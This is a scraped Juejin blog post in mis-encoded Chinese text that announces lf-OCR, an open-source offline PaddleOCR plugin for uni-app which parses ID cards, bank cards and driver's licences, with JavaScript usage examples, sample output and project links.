itemtype="http://schema.org/Article" data-entry-id="7594315259462631459" data-draft-id="7594262760940994594" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ğŸš€ å¼€æºä¸€æ¬¾åŸºäº PaddleOCR çš„çº¯ç¦»çº¿ OCR è¯†åˆ«æ’ä»¶ | æ”¯æŒèº«ä»½è¯ã€é“¶è¡Œå¡ã€é©¾é©¶è¯è¯†åˆ«"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-13T01:30:06.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="èœå–µ007"/> <meta itemprop="url" content="https://juejin.cn/user/3349527784076185"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ğŸš€ å¼€æºä¸€æ¬¾åŸºäº PaddleOCR çš„çº¯ç¦»çº¿ OCR è¯†åˆ«æ’ä»¶ | æ”¯æŒèº«ä»½è¯ã€é“¶è¡Œå¡ã€é©¾é©¶è¯è¯†åˆ«
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3349527784076185/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    èœå–µ007
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T01:30:06.000Z" title="Tue Jan 13 2026 01:30:06 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ğŸš€ å¼€æºä¸€æ¬¾åŸºäº PaddleOCR çš„çº¯ç¦»çº¿ OCR è¯†åˆ«æ’ä»¶ | æ”¯æŒèº«ä»½è¯ã€é“¶è¡Œå¡ã€é©¾é©¶è¯è¯†åˆ«</h2>
<blockquote>
<p>ä¸ä¾èµ–ä»»ä½•äº‘æœåŠ¡ï¼Œæ‰€æœ‰è¯†åˆ«åœ¨æœ¬åœ°å®Œæˆï¼Œéšç§å®‰å…¨æœ‰ä¿éšœï¼</p>
</blockquote>
<hr/>
<h3 data-id="heading-1">å‰è¨€</h3>
<p>åœ¨ç§»åŠ¨åº”ç”¨å¼€å‘ä¸­ï¼ŒOCR è¯†åˆ«æ˜¯ä¸€ä¸ªå¸¸è§éœ€æ±‚ï¼Œå°¤å…¶æ˜¯è¯ä»¶è¯†åˆ«åœºæ™¯ï¼šèº«ä»½è¯å®åè®¤è¯ã€é“¶è¡Œå¡ç»‘å®šã€é©¾é©¶è¯ä¿¡æ¯å½•å…¥ç­‰ã€‚</p>
<p>ç„¶è€Œï¼Œå¸‚é¢ä¸Šå¤§å¤šæ•° OCR æ–¹æ¡ˆéƒ½ä¾èµ–äº‘æœåŠ¡ APIï¼Œå­˜åœ¨ä»¥ä¸‹é—®é¢˜ï¼š</p>
<ul>
<li>ğŸ’° <strong>æˆæœ¬é«˜</strong> - æŒ‰è°ƒç”¨æ¬¡æ•°æ”¶è´¹ï¼Œé‡å¤§æ—¶è´¹ç”¨æƒŠäºº</li>
<li>ğŸŒ <strong>éœ€è¦ç½‘ç»œ</strong> - ç¦»çº¿åœºæ™¯æ— æ³•ä½¿ç”¨</li>
<li>ğŸ”“ <strong>éšç§é£é™©</strong> - æ•æ„Ÿè¯ä»¶æ•°æ®ä¸Šä¼ åˆ°ç¬¬ä¸‰æ–¹æœåŠ¡å™¨</li>
</ul>
<p>ä¸ºäº†è§£å†³è¿™äº›ç—›ç‚¹ï¼Œæˆ‘å¼€å‘äº† <strong>lf-OCR</strong> â€”â€” ä¸€æ¬¾åŸºäº PaddleOCR çš„<strong>çº¯ç¦»çº¿ OCR è¯†åˆ«æ’ä»¶</strong>ï¼Œä¸“ä¸º uni-app å¤šç«¯å¼€å‘è®¾è®¡ã€‚</p>
<hr/>
<h3 data-id="heading-2">âœ¨ æ ¸å¿ƒç‰¹æ€§</h3>









































<table><thead><tr><th>ç‰¹æ€§</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>ğŸ”’ <strong>çº¯ç¦»çº¿</strong></td><td>æ‰€æœ‰æ¨¡å‹å’Œä¾èµ–æœ¬åœ°åŒ–ï¼Œæ— éœ€ç½‘ç»œå³å¯ä½¿ç”¨</td></tr><tr><td>ğŸš€ <strong>é«˜æ€§èƒ½</strong></td><td>åŸºäº PaddleOCRï¼Œè¯†åˆ«é€Ÿåº¦å¿«ã€å‡†ç¡®ç‡é«˜</td></tr><tr><td>ğŸ¯ <strong>ä¸­æ–‡ä¼˜åŒ–</strong></td><td>ä¸“ä¸ºä¸­æ–‡åœºæ™¯ä¼˜åŒ–ï¼Œè¯†åˆ«æ•ˆæœå‡ºè‰²</td></tr><tr><td>ğŸ“± <strong>å¤šå¹³å°</strong></td><td>æ”¯æŒ H5ã€App (Android/iOS)</td></tr><tr><td>ğŸªª <strong>è¯ä»¶è¯†åˆ«</strong></td><td>å†…ç½®èº«ä»½è¯ã€é“¶è¡Œå¡ã€é©¾é©¶è¯è§£ææ¨¡æ¿</td></tr><tr><td>âœ… <strong>æ™ºèƒ½éªŒè¯</strong></td><td>è‡ªåŠ¨éªŒè¯è¯ä»¶æœ‰æ•ˆæ€§ï¼ˆæ ¡éªŒç ã€æœ‰æ•ˆæœŸç­‰ï¼‰</td></tr><tr><td>ğŸ”„ <strong>è‡ªåŠ¨è¯†åˆ«</strong></td><td>æ™ºèƒ½åˆ¤æ–­è¯ä»¶æ­£åé¢ï¼Œæ— éœ€æ‰‹åŠ¨æŒ‡å®š</td></tr><tr><td>ğŸ”§ <strong>æ˜“äºæ‰©å±•</strong></td><td>æ”¯æŒè‡ªå®šä¹‰æ¨¡å‹å’Œè¯†åˆ«æ¨¡æ¿</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-3">ğŸ“¦ æŠ€æœ¯æ¶æ„</h3>
<pre><code class="hljs language-scss" lang="scss">lf-OCR
â”œâ”€â”€ æ ¸å¿ƒå¼•æ“ (PaddleOCR + ONNX Runtime + OpenCV.js)
â”œâ”€â”€ è¯ä»¶è§£ææ¨¡æ¿ (èº«ä»½è¯/é“¶è¡Œå¡/é©¾é©¶è¯/é€šç”¨)
â”œâ”€â”€ æ ¡éªŒå·¥å…· (èº«ä»½è¯å·/é“¶è¡Œå¡å·/æ‰‹æœºå·ç­‰)
â””â”€â”€ æ ¼å¼åŒ–å·¥å…· (æ—¥æœŸ/é‡‘é¢/æ‰‹æœºå·ç­‰)
</code></pre>
<p>æ•´ä¸ªæ’ä»¶å¤§å°çº¦ 35MBï¼ŒåŒ…å«ï¼š</p>
<ul>
<li><strong>ppocr_det.onnx</strong> - æ–‡å­—æ£€æµ‹æ¨¡å‹</li>
<li><strong>ppocr_rec.onnx</strong> - æ–‡å­—è¯†åˆ«æ¨¡å‹</li>
<li><strong>OpenCV.js</strong> - å›¾åƒå¤„ç†</li>
<li><strong>ONNX Runtime</strong> - æ¨¡å‹æ¨ç†</li>
</ul>
<hr/>
<h3 data-id="heading-4">ğŸ® å¿«é€Ÿä¸Šæ‰‹</h3>
<h4 data-id="heading-5">å®‰è£…</h4>
<p>åœ¨ HBuilder æ’ä»¶å¸‚åœºæœç´¢ <code>lf-OCR</code> å¯¼å…¥ï¼Œæˆ–æ‰‹åŠ¨å¤åˆ¶åˆ° <code>uni_modules</code> ç›®å½•ã€‚</p>
<h4 data-id="heading-6">åŸºç¡€ä½¿ç”¨</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> lfOCR <span class="hljs-keyword">from</span> <span class="hljs-string">"@/uni_modules/lf-OCR/index.js"</span>;

<span class="hljs-comment">// åˆå§‹åŒ–å¼•æ“</span>
<span class="hljs-keyword">await</span> lfOCR.<span class="hljs-title function_">init</span>({
  <span class="hljs-attr">onProgress</span>: <span class="hljs-function">(<span class="hljs-params">msg</span>) =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"åŠ è½½è¿›åº¦:"</span>, msg),
});

<span class="hljs-comment">// è¯†åˆ«èº«ä»½è¯</span>
<span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> lfOCR.<span class="hljs-title function_">recognize</span>(imagePath, <span class="hljs-string">"idCard"</span>);

<span class="hljs-keyword">if</span> (result.<span class="hljs-property">valid</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"å§“å:"</span>, result.<span class="hljs-property">name</span>);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"èº«ä»½è¯å·:"</span>, result.<span class="hljs-property">idNumber</span>);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"åœ°å€:"</span>, result.<span class="hljs-property">address</span>);
}
</code></pre>
<h4 data-id="heading-7">è¿”å›æ•°æ®ç¤ºä¾‹</h4>
<p><strong>èº«ä»½è¯æ­£é¢è¯†åˆ«ç»“æœï¼š</strong></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"å¼ ä¸‰"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"gender"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ç”·"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"ethnicity"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"æ±‰æ—"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"birthDate"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"1990å¹´01æœˆ01æ—¥"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"address"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"åŒ—äº¬å¸‚æœé˜³åŒºæŸæŸè¡—é“123å·"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"idNumber"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"110101199001011234"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"valid"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"side"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"front"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<hr/>
<h3 data-id="heading-8">ğŸªª æ”¯æŒçš„è¯ä»¶ç±»å‹</h3>
<h4 data-id="heading-9">1. èº«ä»½è¯è¯†åˆ«</h4>
<p>è‡ªåŠ¨åˆ¤æ–­æ­£åé¢ï¼Œæå–å®Œæ•´ä¿¡æ¯ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { parseIdCard, validateIdCard } <span class="hljs-keyword">from</span> <span class="hljs-string">"@/uni_modules/lf-OCR/index.js"</span>;

<span class="hljs-keyword">const</span> result = <span class="hljs-title function_">parseIdCard</span>(ocrText);

<span class="hljs-keyword">if</span> (result.<span class="hljs-property">side</span> === <span class="hljs-string">"front"</span>) {
  <span class="hljs-comment">// æ­£é¢ï¼šå§“åã€æ€§åˆ«ã€æ°‘æ—ã€å‡ºç”Ÿæ—¥æœŸã€åœ°å€ã€èº«ä»½è¯å·</span>
  <span class="hljs-keyword">const</span> validation = <span class="hljs-title function_">validateIdCard</span>(result.<span class="hljs-property">idNumber</span>);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"å¹´é¾„:"</span>, validation.<span class="hljs-property">info</span>.<span class="hljs-property">age</span>);
} <span class="hljs-keyword">else</span> {
  <span class="hljs-comment">// èƒŒé¢ï¼šç­¾å‘æœºå…³ã€æœ‰æ•ˆæœŸé™</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"æ˜¯å¦è¿‡æœŸ:"</span>, result.<span class="hljs-property">isExpired</span>);
}
</code></pre>
<h4 data-id="heading-10">2. é“¶è¡Œå¡è¯†åˆ«</h4>
<p>æ”¯æŒå›½å†…ä¸»æµé“¶è¡Œå¡ï¼Œè‡ªåŠ¨è¯†åˆ«é“¶è¡Œå’Œå¡ç±»å‹ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { parseBankCard } <span class="hljs-keyword">from</span> <span class="hljs-string">"@/uni_modules/lf-OCR/index.js"</span>;

<span class="hljs-keyword">const</span> result = <span class="hljs-title function_">parseBankCard</span>(ocrText);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"å¡å·:"</span>, result.<span class="hljs-property">cardNumberFormatted</span>); <span class="hljs-comment">// 6222 0212 3456 7890 123</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"é“¶è¡Œ:"</span>, result.<span class="hljs-property">bankName</span>); <span class="hljs-comment">// ä¸­å›½å·¥å•†é“¶è¡Œ</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"ç±»å‹:"</span>, result.<span class="hljs-property">cardType</span>); <span class="hljs-comment">// å€Ÿè®°å¡</span>
</code></pre>
<h4 data-id="heading-11">3. é©¾é©¶è¯è¯†åˆ«</h4>
<p>æ”¯æŒä¸»é¡µå’Œå‰¯é¡µè¯†åˆ«ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { parseDriverLicense } <span class="hljs-keyword">from</span> <span class="hljs-string">"@/uni_modules/lf-OCR/index.js"</span>;

<span class="hljs-keyword">const</span> result = <span class="hljs-title function_">parseDriverLicense</span>(ocrText);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"å‡†é©¾è½¦å‹:"</span>, result.<span class="hljs-property">licenseClass</span>); <span class="hljs-comment">// C1</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"è½¦å‹æè¿°:"</span>, result.<span class="hljs-property">licenseClassDesc</span>); <span class="hljs-comment">// å°å‹æ±½è½¦</span>
</code></pre>
<hr/>
<h3 data-id="heading-12">âœ… å†…ç½®æ ¡éªŒåŠŸèƒ½</h3>
<p>æ’ä»¶ä¸ä»…èƒ½è¯†åˆ«æ–‡å­—ï¼Œè¿˜èƒ½<strong>éªŒè¯è¯ä»¶æœ‰æ•ˆæ€§</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> {
  validateIdCard,
  validateBankCard,
} <span class="hljs-keyword">from</span> <span class="hljs-string">"@/uni_modules/lf-OCR/index.js"</span>;

<span class="hljs-comment">// èº«ä»½è¯æ ¡éªŒï¼ˆå«æ ¡éªŒç éªŒè¯ï¼‰</span>
<span class="hljs-keyword">const</span> idResult = <span class="hljs-title function_">validateIdCard</span>(<span class="hljs-string">"110101199001011234"</span>);
<span class="hljs-keyword">if</span> (idResult.<span class="hljs-property">valid</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"åœ°åŒº:"</span>, idResult.<span class="hljs-property">info</span>.<span class="hljs-property">region</span>);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"å‡ºç”Ÿæ—¥æœŸ:"</span>, idResult.<span class="hljs-property">info</span>.<span class="hljs-property">birthDate</span>);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"æ€§åˆ«:"</span>, idResult.<span class="hljs-property">info</span>.<span class="hljs-property">gender</span>);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"å¹´é¾„:"</span>, idResult.<span class="hljs-property">info</span>.<span class="hljs-property">age</span>);
}

<span class="hljs-comment">// é“¶è¡Œå¡æ ¡éªŒï¼ˆLuhn ç®—æ³•ï¼‰</span>
<span class="hljs-keyword">const</span> bankResult = <span class="hljs-title function_">validateBankCard</span>(<span class="hljs-string">"6222021234567890123"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"æ˜¯å¦æœ‰æ•ˆ:"</span>, bankResult.<span class="hljs-property">valid</span>);
</code></pre>
<hr/>
<h3 data-id="heading-13">ğŸ”§ æ‰©å±•å¼€å‘</h3>
<h4 data-id="heading-14">æ›´æ¢ OCR æ¨¡å‹</h4>
<p>æ”¯æŒæ›¿æ¢ä¸ºå…¶ä»– ONNX æ ¼å¼æ¨¡å‹ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">hybrid/html/models/
â”œâ”€â”€ ppocr_det.onnx      <span class="hljs-comment"># æ›¿æ¢æ£€æµ‹æ¨¡å‹</span>
â”œâ”€â”€ ppocr_rec.onnx      <span class="hljs-comment"># æ›¿æ¢è¯†åˆ«æ¨¡å‹</span>
â””â”€â”€ ppocr_keys_v1.txt   <span class="hljs-comment"># æ›¿æ¢å­—å…¸æ–‡ä»¶</span>
</code></pre>
<h4 data-id="heading-15">æ–°å¢è¯†åˆ«æ¨¡æ¿</h4>
<p>åœ¨ <code>js_sdk/templates/</code> ç›®å½•ä¸‹åˆ›å»ºæ–°æ¨¡æ¿ï¼Œå®ç°è‡ªå®šä¹‰è¯ä»¶è§£æï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// js_sdk/templates/passport.js</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">parsePassport</span>(<span class="hljs-params">text, lines = []</span>) {
  <span class="hljs-keyword">const</span> result = {
    <span class="hljs-attr">name</span>: <span class="hljs-string">""</span>,
    <span class="hljs-attr">passportNumber</span>: <span class="hljs-string">""</span>,
    <span class="hljs-attr">nationality</span>: <span class="hljs-string">""</span>,
    <span class="hljs-attr">valid</span>: <span class="hljs-literal">false</span>,
  };

  <span class="hljs-comment">// å®ç°å­—æ®µæå–é€»è¾‘...</span>

  <span class="hljs-keyword">return</span> result;
}
</code></pre>
<hr/>
<h3 data-id="heading-16">ğŸ“± å¹³å°å…¼å®¹æ€§</h3>

























<table><thead><tr><th>å¹³å°</th><th>æ”¯æŒ</th></tr></thead><tbody><tr><td>H5</td><td>âœ…</td></tr><tr><td>App (Android)</td><td>âœ…</td></tr><tr><td>App (iOS)</td><td>âœ…</td></tr><tr><td>å¾®ä¿¡å°ç¨‹åº</td><td>âŒ (ä¸æ”¯æŒ WebAssembly)</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-17">ğŸ”— é¡¹ç›®åœ°å€</h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fftcvictory%2Flocal-OCR" target="_blank" title="https://github.com/ftcvictory/local-OCR" ref="nofollow noopener noreferrer">GitHub</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Flefan_suitable%2Flocal-ocr" target="_blank" title="https://gitee.com/lefan_suitable/local-ocr" ref="nofollow noopener noreferrer">Gitee</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fext.dcloud.net.cn%2Fplugin%3Fid%3D26471" target="_blank" title="https://ext.dcloud.net.cn/plugin?id=26471" ref="nofollow noopener noreferrer">DCloud æ’ä»¶å¸‚åœº</a></li>
</ul>
<hr/>
<h3 data-id="heading-18">ğŸ¤” å¸¸è§é—®é¢˜</h3>
<h4 data-id="heading-19">Q: è¯†åˆ«å‡†ç¡®ç‡å¦‚ä½•ï¼Ÿ</h4>
<p>A: åŸºäº PaddleOCRï¼Œä¸­æ–‡è¯†åˆ«å‡†ç¡®ç‡å¯è¾¾ 95% ä»¥ä¸Šã€‚å»ºè®®ä½¿ç”¨æ¸…æ™°ã€å…‰çº¿å……è¶³çš„å›¾ç‰‡ã€‚</p>
<h4 data-id="heading-20">Q: æ”¯æŒå“ªäº›è¯ä»¶ï¼Ÿ</h4>
<p>A: ç›®å‰å†…ç½®èº«ä»½è¯ã€é“¶è¡Œå¡ã€é©¾é©¶è¯æ¨¡æ¿ï¼ŒåŒæ—¶æ”¯æŒé€šç”¨æ–‡å­—è¯†åˆ«ã€‚åç»­ä¼šæŒç»­æ›´æ–°ã€‚</p>
<h4 data-id="heading-21">Q: å¦‚ä½•æ·»åŠ æ–°è¯ä»¶ç±»å‹ï¼Ÿ</h4>
<p>A: åœ¨ <code>js_sdk/templates/</code> ç›®å½•ä¸‹åˆ›å»ºæ–°æ¨¡æ¿æ–‡ä»¶ï¼Œå‚è€ƒç°æœ‰æ¨¡æ¿å®ç°å³å¯ã€‚</p>
<hr/>
<h3 data-id="heading-22">ğŸ“„ å¼€æºåè®®</h3>
<p>MIT License - å¯å…è´¹ç”¨äºå•†ä¸šé¡¹ç›®</p>
<hr/>
<h3 data-id="heading-23">ğŸ™ è‡´è°¢</h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FPaddlePaddle%2FPaddleOCR" target="_blank" title="https://github.com/PaddlePaddle/PaddleOCR" ref="nofollow noopener noreferrer">PaddleOCR</a> - æä¾›é«˜è´¨é‡ OCR æ¨¡å‹</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fonnxruntime.ai%2F" target="_blank" title="https://onnxruntime.ai/" ref="nofollow noopener noreferrer">ONNX Runtime</a> - è·¨å¹³å°æ¨¡å‹æ¨ç†</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fopencv.org%2F" target="_blank" title="https://opencv.org/" ref="nofollow noopener noreferrer">OpenCV.js</a> - å›¾åƒå¤„ç†</li>
</ul>
<hr/>
<p>å¦‚æœè¿™ä¸ªé¡¹ç›®å¯¹ä½ æœ‰å¸®åŠ©ï¼Œæ¬¢è¿ â­ï¸ Star æ”¯æŒä¸€ä¸‹ï¼æœ‰é—®é¢˜æˆ–å»ºè®®ä¹Ÿæ¬¢è¿æ Issue è®¨è®ºã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸‰æ­¥æå®šçŸ­ä¿¡éªŒè¯ç ï¼SpringBooté›†æˆé˜¿é‡Œäº‘çŸ­ä¿¡å®æˆ˜]]></title>    <link>https://juejin.cn/post/7594396523439882275</link>    <guid>https://juejin.cn/post/7594396523439882275</guid>    <pubDate>2026-01-13T03:55:01.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594396523439882275" data-draft-id="7594396368174104611" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸‰æ­¥æå®šçŸ­ä¿¡éªŒè¯ç ï¼SpringBooté›†æˆé˜¿é‡Œäº‘çŸ­ä¿¡å®æˆ˜"/> <meta itemprop="keywords" content="åç«¯,Java,Spring Boot"/> <meta itemprop="datePublished" content="2026-01-13T03:55:01.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ‚Ÿç©ºç å­—"/> <meta itemprop="url" content="https://juejin.cn/user/3139860942296830"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
